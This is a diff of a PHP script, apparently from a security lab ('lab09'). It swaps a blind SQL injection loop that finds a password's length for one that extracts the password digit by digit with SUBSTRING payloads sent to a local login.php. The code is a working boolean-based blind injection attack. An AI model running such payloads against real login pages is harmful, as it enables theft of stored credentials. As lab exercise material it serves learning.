@@ -25,7 +25,7 @@ for ($i = 1; $i <= 5; $i++) {
 */
 
 
-$sizepwd = 0;
+/*$sizepwd = 0;
 while ($sizepwd < 25)
 {
     $url="http://localhost/lab09/login.php?u=\"%20or%20id%20=%2098%20and%20length(password)%20=%20$sizepwd--%20";
@@ -43,7 +43,23 @@ while ($sizepwd < 25)
 }
 
 echo 'sizepwd is ';
-print $sizepwd;
+print $sizepwd;*/
+
+
+for ($i = 1; $i <= 8; $i++) {
+    foreach (range(0, 9) as $letter){
+         //echo "$letter \n";
+    	$url="http://localhost/lab09/login.php?u=\"%20or%20id%20=%2098%20and%20SUBSTRING(password,$i,1)%20=%20%27$letter%27%20--%20";
+		$result = file_get_contents($url);
+		if (strpos($result, 'cat') !== false) {
+			echo "\n";
+			print "$letter";
+			break;
+		}else{
+			
+		}
+	}   
+}
 
 
 /*Ceci marche
